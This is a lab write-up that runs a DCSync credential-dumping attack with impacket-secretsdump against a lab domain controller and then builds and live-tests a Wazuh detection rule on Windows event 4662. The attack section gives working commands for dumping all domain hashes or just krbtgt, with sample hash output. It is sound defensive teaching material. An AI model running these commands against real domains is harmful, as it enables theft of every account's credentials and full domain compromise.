# Lab 05 - DCSync

## Objective
Detect **DCSync** - an attacker who holds a sufficiently privileged account
impersonating a domain controller and asking a real DC to **replicate** account
password data over the directory-replication protocol (MS-DRSR). It is the cleanest
way to steal every secret in a domain, `krbtgt` included: no code runs on the DC,
nothing is written to its disk, no `NTDS.dit` is copied. The only artifact is the
**replication request itself**.

DCSync is not initial access - it presupposes privilege. In a default domain only
Domain Admins / Enterprise Admins / Administrators / domain controllers hold the
`DS-Replication-Get-Changes-All` extended right. So this lab models the realistic
mid-kill-chain position: an attacker with stolen high-privilege credentials (or one
who has abused an ACL to grant themselves the replication rights) converting that
privilege into the entire credential store. The attack is run from Kali + impacket
against the Lab 01 domain controller; detection is built on the **4662** event it
produces on the Security channel, as Wazuh rule **100603**.

The headline is deliberate continuity with Lab 04. That lab proved event 4662 is
**blind** to LDAP-read reconnaissance (default AD objects carry no read-audit SACL)
and that the channel which *does* see recon - Directory Service / 1644 - is decoded
and archived by Wazuh but **never routed into the rule engine**. DCSync returns
detection to the always-on **Security** channel and, crucially, to a 4662 that
*does* fire by default - because the domain-head object carries a default audit SACL
for the replication control-access rights. Same event ID, opposite outcome, and the
difference is measured, not assumed.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Credential Access (TA0006) |
| Technique | **T1003.006** - OS Credential Dumping: DCSync |
| Log source | Windows **Security** channel, event **4662** (Directory Service object access) carrying the DS-Replication-Get-Changes-All control-access right |
| Reference | https://attack.mitre.org/techniques/T1003/006/ |

## Environment
| Component | Details |
|---|---|
| Domain controller / target | `DC01` (Windows Server 2022), `lab.local`, 192.168.56.10, Wazuh agent **004** |
| Attacker | Kali + impacket (`impacket-secretsdump`), 192.168.56.80, host-only |
| Manager | Wazuh 4.14.6 all-in-one, Ubuntu, 192.168.56.79 |
| Attacker identity | `lab.local\Administrator` (any account holding the replication rights) |
| Custom rule | **100603**, level 12 |

The audit subcategory that writes 4662 - **Audit Directory Service Access** - was
enabled back in Lab 01, so no configuration change was needed for this lab. Auth to
the DC is over **NTLM** (a password in the impacket target string), which is not
clock-sensitive; the environment's unmanaged clocks (UTC manager vs. local-time DC)
matter only for correlating timestamps by eye, not for the attack.

## The attack

`impacket-secretsdump` with `-just-dc` performs the DCSync. Omitting the password
from the target string makes impacket prompt for it, so the credential never lands
in shell history:

```bash
impacket-secretsdump 'lab.local/Administrator@192.168.56.10' -just-dc
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435...:570a9a65db8fba761c1008a51d4c95ab:::
krbtgt:502:aad3b435...:e4e62d01f9e5282caa1ebbd6903ded6b:::
lab.local\svc-sql:1104:aad3b435...:c5d5470f74de310c58e87c3dd3d0ea45:::
DC01$:1000:aad3b435...:aa9c7c660377ba3df408cd27413ab53b:::
[*] Kerberos keys grabbed
```

Every account's NT hash and Kerberos keys, replicated to the attacker over the
wire. The `krbtgt` hash is the prize - it is the key to forging Golden Tickets
(Lab 06).

A stealthier operator does not dump the whole domain. `-just-dc-user` replicates a
single account - typically `krbtgt`, the minimum needed for a Golden Ticket:

```bash
impacket-secretsdump 'lab.local/Administrator@192.168.56.10' -just-dc-user krbtgt
```

This still issues the same replication request, so it still emits the fingerprint
4662 - fewer of them, but the detection keys on the *right requested*, not the
volume dumped.

## Measure-first: does 4662 actually see DCSync?

The Lab 04 discipline - run the real attack and **count the events before building
anything** - is what separates this lab from a coverage chart that lies. Before
deploying any rule, one `-just-dc` run was measured on the DC:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662; StartTime=$t} |
  Where-Object { $_.Message -match '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' } |
  Measure-Object | Select-Object -ExpandProperty Count
# -> 7
```

**Seven 4662 events**, each carrying the Get-Changes-All GUID, actor
`Administrator`. Where Lab 04's BloodHound sweep produced **zero** 4662, DCSync
produces them reliably. The reason is the SACL: default AD objects have no
read-audit SACL on the attributes BloodHound reads, but the **domain-head object
carries a default audit SACL for the replication control-access rights**, so a
replication request is audited out of the box. This is the entire Lab-05-vs-Lab-04
distinction, and it is empirical.

## The detection problem

You cannot alert on "a 4662 happened" - the DC generates them for its own internal
directory work. The baseline, measured over the two hours before the attack, shows
exactly what legitimate replication auditing looks like:

```
Account Name:  DC01$          (SID S-1-5-18 / SYSTEM)
Properties:    {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   (DS-Replication-Get-Changes)
Access Mask:   0x100          (Control Access)
```

Two fields separate that housekeeping from the attack:

| Signal | Legit DC housekeeping | DCSync attack |
|---|---|---|
| `Properties` (control-access GUID) | `1131f6aa` - Get-**Changes** | **`1131f6ad`** - Get-**Changes-All** (returns secret attributes) |
| `subjectUserName` | `DC01$` - a **machine account** (`$` suffix) | **`Administrator`** - a user account |

`1131f6ad` (Get-Changes-All) is the right that actually returns password data; the
DC's own housekeeping uses the sibling `1131f6aa`. And legitimate replication is
performed by **machine accounts** (`DC01$`) - a user or service account requesting
replication is the attack. On this single-DC forest the GUID alone already
separates the two, but the machine-account negation is the load-bearing filter for
realism: in a multi-DC domain, DCs legitimately exchange Get-Changes-All between
their `$`-suffixed accounts. Rule 100603 requires **both**.

## Coverage gap in the shipped ruleset - not a shadow

Grepping the entire shipped ruleset for 4662 returns exactly one hit - `44662`, a
FortiMail rule. **No shipped rule keys on event 4662 at all.** Like the 4768 gap in
Lab 03 (and unlike Lab 02's active *shadow*), the event simply falls through to the
generic **AUDIT_SUCCESS** parent, rule **60103** (`level="0"`, matches
`win.system.severityValue ^AUDIT_SUCCESS$`), where it decodes cleanly and never
alerts. The fix is the same first-match-wins pattern the module has used
throughout: chain the custom rule off `60103` as its child so it is evaluated on
every audit-success event and can escalate the DCSync pattern.

## Custom rule 100603

```xml
<rule id="100603" level="12">
  <if_sid>60103</if_sid>
  <field name="win.system.eventID">^4662$</field>
  <field name="win.eventdata.properties" type="pcre2">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</field>
  <field name="win.eventdata.subjectUserName" negate="yes" type="pcre2">\$$</field>
  <description>DCSync: DS-Replication-Get-Changes-All requested by non-DC account $(win.eventdata.subjectUserName) from $(win.eventdata.subjectDomainName) - credential theft [T1003.006]</description>
  <mitre><id>T1003.006</id></mitre>
  <options>no_full_log</options>
  <group>dcsync,pci_dss_10.2.4,gdpr_IV_35.7.d,</group>
</rule>
```

- `<if_sid>60103</if_sid>` - child of the AUDIT_SUCCESS parent (the reachability fix).
- `win.system.eventID ^4662$` - the directory object-access event.
- `win.eventdata.properties` must contain the **Get-Changes-All** GUID (`type="pcre2"`
  for the substring match against the field, which arrives as `%%7688 {1131f6ad-...}
  {19195a5b-...}`).
- `win.eventdata.subjectUserName` **negated** against `\$$` - excludes `DC01$` and
  every other machine account; `type="pcre2"` is required for the regex anchor.

## Detection results

Deployed via scp + md5 verification (base64 paste homoglyph-corrupted a rule in Lab
03; SSH heredocs silently triple-append), syntax-checked with `wazuh-analysisd -t`,
manager restarted, and validated by **live fire** - the only proof that counts on a
Windows channel, per the Lab 04 finding that `wazuh-logtest` can decode-and-match an
event the live agent path never routes.

| # | Test | Expectation | Result |
|---|---|---|---|
| 1 | Full DCSync (`-just-dc`) | 100603 fires | **7 alerts, level 12**, actor `Administrator`, decoder `windows_eventchannel` |
| 2 | Targeted DCSync (`-just-dc-user krbtgt`) - stealth variant | still fires on fewer events | **+1 alert (8 total)** - single-object replication caught |
| 3 | DC's own replication housekeeping (`DC01$` / Get-Changes) | **no** alert | **0** - excluded by both the machine-account negation and the Get-Changes-All GUID |

Test 3 is the negative control, and it was observed live rather than contrived: the
`DC01$` Get-Changes events sit in the same log the rule evaluated, and none of them
produced a 100603 alert. Confirmed directly:

```bash
sudo grep '"id":"100603"' /var/ossec/logs/alerts/alerts.json \
  | grep -o '"subjectUserName":"[^"]*"' | sort | uniq -c
#   7 "subjectUserName":"Administrator"      (zero DC01$)
```

The live alert, abbreviated:

```json
"rule":{"level":12,"id":"100603","firedtimes":7,
  "description":"DCSync: DS-Replication-Get-Changes-All requested by non-DC account Administrator from LAB - credential theft [T1003.006]",
  "mitre":{"id":["T1003.006"],"tactic":["Credential Access"],"technique":["DCSync"]}},
"agent":{"id":"004","name":"DC01"},
"data":{"win":{"system":{"eventID":"4662","channel":"Security"},
  "eventdata":{"subjectUserName":"Administrator",
    "properties":"%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}"}}}}
```

Wazuh resolved the MITRE technique id to its tactic and name automatically
(`Credential Access` / `DCSync`) from the single `<id>T1003.006</id>` mapping.

## Notes, limitations, lessons learned

- **The SACL is why this works, and it is worth understanding.** DCSync detection
  via 4662 is reliable *only because* the domain-head object ships with an audit
  SACL for the replication rights. That is a default, but it is a default that can
  be removed; a detection built on it should be paired with awareness that an
  attacker with enough privilege to DCSync also has enough to tamper with auditing.
  The measure-first count is what proved the SACL was actually present here rather
  than assumed.
- **GUID precision buys the low false-positive rate.** Keying on Get-Changes-All
  (`1131f6ad`) rather than any replication right means the DC's own hourly
  Get-Changes housekeeping never enters the picture. The machine-account negation
  is the second, independent guard - either one alone would still fire on the
  legitimate cross-DC case in a real domain, so the rule requires both.
- **Detection is of the *request*, not the theft.** No process runs on the DC and
  no file is touched, so EDR process/file telemetry sees nothing. The replication
  request on the Security channel is the entire signal - which is also why an
  attacker who disables that audit subcategory (or lacks the SACL) goes dark. The
  compensating control is that DCSync requires privilege the attacker had to steal
  first; the earlier-kill-chain detections (Kerberoasting, AS-REP) are the earlier
  chance to catch them.
- **Stealth variant matters for the writeup.** A rule tested only against the noisy
  full dump can hide a dependence on volume. Testing `-just-dc-user krbtgt` proved
  the rule fires on a single-object replication - the form a careful attacker
  actually uses, and the one that stages Lab 06.
- **A DCSync-capable attacker owns `krbtgt`.** This dump yielded the `krbtgt` hash
  (`e4e62d01...`) and its AES keys - total domain compromise material, and the input
  to the Golden Ticket capstone. Treated as such.
- **Possible rule extension (not deployed):** the third replication right,
  `DS-Replication-Get-Changes-In-Filtered-Set` (`89e95b76-444d-4c62-991a-0facbeda640c`),
  is used in some replication scenarios; a broader rule could match any of the three
  GUIDs. Deferred - Get-Changes-All is the one that returns secrets and the one
  every DCSync tool requests, so it is the highest-fidelity single discriminator.

## Status
**Complete.** Attack validated (full and targeted), telemetry measured before
building, rule 100603 live-fired with a live negative control. Detection returns to
the Security channel and dodges the Lab 04 routing wall. Rule **100603** deployed and
firing at level 12. Next: **Lab 06 - Golden Ticket / anomaly correlation (capstone)**
(event 4769, rule 100604), using the `krbtgt` key this lab extracted.
